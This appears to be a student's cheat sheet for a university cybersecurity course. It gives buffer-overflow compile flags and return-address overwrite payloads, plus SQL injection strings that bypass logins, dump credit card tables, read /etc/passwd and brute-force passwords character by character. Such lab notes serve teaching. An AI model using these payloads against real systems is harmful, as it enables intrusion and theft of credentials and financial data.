# UNIMORE-cyber-security

## Buffer Overflow
```commandline
gcc -w -m32 -fno-stack-protector -fno-pic -no-pie -g -o
```

```commandline
python3 -c 'print("A"*number)' | ./esercizio1
```

### GDB
```commandline
$ gdb esercizio1
(gdb) disassamble main
```

### BE AWARE!!
```commandline
mov (or movb, movl, movw, movq)
lea
cmpl
```

### python2
```python
a = ""
for _ in range(10):
    a += "A"
print(a + '\x6b\x84\x04\x08')
```

### python3
```python
import sys

length = 10
payload = b"A" * length + b'\x6b\x84\x04\x08'
sys.stdout.buffer.write(payload)
```

## SQL Injection
> a space after the -- (comment macro) is required
```commandline
'-- 
```
```commandline
' or ''='' -- 
```
```commandline
' union select null, table_name, column_name,null,null,null,null from INFORMATION_SCHEMA.COLUMNS where table_name = 'credit_cards' -- 
```
```commandline
' union select null, ccnumber, ccv, expiration,null,null,null from credit_cards -- 
```
```commandline
' union select null, ccv, expiration,null,null,null,null from credit_cards where ccnumber=1234567812345678 -- 
```
```commandline
' union select null, LOAD_FILE('/etc/passwd'), null,null,null,null,null from credit_cards where ccnumber=1234567812345678 -- 
```
```commandline
scotty' AND password=(SELECT password FROM accounts WHERE username = 'scotty') -- 
```
```commandline
' OR LENGTH((SELECT password FROM accounts WHERE username='scotty'))=8 -- 
```
```commandline
john' AND LENGTH(password)=6; -- 
```
```commandline
john' AND SUBSTRING(password,-6,1)='m'; -- 
john' AND SUBSTRING(password,-6,1)='m' AND SUBSTRING(password,-5,1)='o'; -- 
john' AND SUBSTRING(password,-6,1)='m' AND SUBSTRING(password,-5,1)='o' AND SUBSTRING(password,-4,1)='n'; --
```
